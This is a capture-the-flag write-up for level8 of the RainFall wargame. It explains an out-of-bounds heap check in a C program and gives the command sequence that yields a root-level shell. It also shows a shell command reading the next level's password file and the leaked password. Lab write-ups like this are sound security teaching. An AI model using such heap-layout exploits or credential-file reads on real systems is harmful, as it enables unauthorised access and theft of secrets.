# level8: Heap Layout Exploitation

## Challenge Overview

Level8 presents a program that manages authentication and services, with a vulnerability in its memory access patterns. The program takes string commands as input and allows setting up auth and service variables, then checking them for a login.

## Source Code Analysis

The program maintains two global pointers:

```c
char *auth = NULL;
char *service = NULL;
```

And implements four commands:

```c
// Handle "auth " command
if (strncmp(input_buffer, "auth ", 5) == 0) {
    auth = malloc(4);  // Only allocates 4 bytes!
    // ...initialize and copy input...
}
// Handle "service" command
else if (strncmp(input_buffer, "service", 7) == 0) {
    service = strdup(input_buffer + 7);  // Allocates on heap
}
// Handle "login" command - key vulnerability
else if (strncmp(input_buffer, "login", 5) == 0) {
    // Vulnerability: auth is only 4 bytes but we check 32 bytes past it
    if (auth != NULL && *(int*)(auth + 32) != 0) {
        system("/bin/sh");
    } else {
        fwrite("Password:\n", 1, 10, stdout);
    }
}
```

## Vulnerability

The vulnerability lies in the `login` command logic, which checks memory 32 bytes beyond the `auth` allocation:

```c
if (auth != NULL && *(int*)(auth + 32) != 0) {
    system("/bin/sh");
}
```

The `auth` pointer only points to a 4-byte region, so checking `auth + 32` is an out-of-bounds memory check. This creates an opportunity to manipulate the heap layout to control what's at that location.

## Exploitation

The exploit takes advantage of how heap memory is allocated:

1. Use `auth` to allocate a small buffer (4 bytes)
2. Use `service` with a large input to allocate memory that will overlap with `auth + 32`
3. Use `login` to trigger the shell when the value at `auth + 32` is non-zero

The program helpfully displays the addresses at each step:

```
level8@RainFall:~$ ./level8
(nil), (nil)                # Both pointers start as NULL
auth A                      # Create auth with small content
0x804a008, (nil)           # Now auth is allocated at 0x804a008
service AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
0x804a008, 0x804a018      # service allocated at 0x804a018
login                      # Call login - the check at auth+32 is non-zero
$                          # Shell granted!
```

Looking at the addresses, we can see:
- `auth` is at 0x804a008
- `service` is at 0x804a018
- The memory at `auth + 32` (0x804a028) will contain non-zero data from our service string

## Getting the Password

Once we have the shell, we retrieve the password:

```bash
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

## Moving to Next Level

Use the password to log in to level9:

```bash
level8@RainFall:~$ su level9
Password: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
level9@RainFall:~$ 
```
